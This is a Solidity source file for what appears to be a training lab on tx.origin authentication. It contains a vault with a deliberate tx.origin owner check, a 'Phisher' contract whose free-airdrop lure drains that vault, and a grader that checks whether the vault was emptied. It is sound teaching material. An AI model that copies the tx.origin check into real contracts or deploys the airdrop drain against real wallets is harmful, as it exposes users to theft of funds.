// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {SolvableBase} from "@common/SolvableBase.sol";

/// @notice Personal vault whose `transferTo` checks `tx.origin == owner`
///         instead of `msg.sender == owner`. Any contract called within
///         the same tx by the owner can drain the vault.
contract TxOriginVault {
    address public immutable owner;

    constructor(address o) payable {
        owner = o;
    }

    function transferTo(address payable to, uint256 amount) external {
        // BUG: tx.origin authentication. Trusts the originating EOA
        //      regardless of which contract is actually calling.
        require(tx.origin == owner, "not owner");
        (bool ok,) = to.call{value: amount}("");
        require(ok, "send failed");
    }

    receive() external payable {}
}

/// @notice A "free airdrop" lure. Calling its only function looks
///         harmless, but internally it drains the target vault using
///         the caller's tx.origin as authorization.
contract Phisher {
    TxOriginVault public immutable vault;
    address payable public immutable beneficiary;
    bool public airdropClaimed;

    /// @param v Target vault.
    /// @param b Where the drained ETH is forwarded. In a real attack this
    ///          would be the attacker's address. In this tutorial it points
    ///          back at the user so they observe their own funds returning.
    constructor(TxOriginVault v, address payable b) {
        vault = v;
        beneficiary = b;
    }

    /// @notice The lure. Looks like a freebie; under the hood it pulls
    ///         the entire vault balance out via the vault's tx.origin check.
    function claimFreeAirdrop() external {
        airdropClaimed = true;
        vault.transferTo(beneficiary, address(vault).balance);
    }
}

/// @notice Multi-tenant tx.origin lab. Each user calls `createInstance()`
///         once; the lab deploys a fresh (vault, phisher) pair owned by
///         them and seeds the vault with `SEED` ETH.
contract TxOriginLab is SolvableBase {
    uint256 public constant SEED = 5 ether;

    struct Instance {
        TxOriginVault vault;
        Phisher phisher;
    }

    mapping(address => Instance) private _instances;

    event InstanceCreated(address indexed user, address vault, address phisher);

    receive() external payable {}

    function createInstance() external returns (address vault, address phisher) {
        require(address(_instances[msg.sender].vault) == address(0), "already created");
        require(address(this).balance >= SEED, "lab underfunded");

        TxOriginVault v = new TxOriginVault{value: SEED}(msg.sender);
        Phisher p = new Phisher(v, payable(msg.sender));

        _instances[msg.sender] = Instance(v, p);
        emit InstanceCreated(msg.sender, address(v), address(p));
        return (address(v), address(p));
    }

    function vaultOf(address user) external view returns (TxOriginVault) {
        return _instances[user].vault;
    }

    function phisherOf(address user) external view returns (Phisher) {
        return _instances[user].phisher;
    }

    function isSolved(address user) public view override returns (bool) {
        Instance memory inst = _instances[user];
        if (address(inst.vault) == address(0)) return false;
        return address(inst.vault).balance == 0 && inst.phisher.airdropClaimed();
    }
}
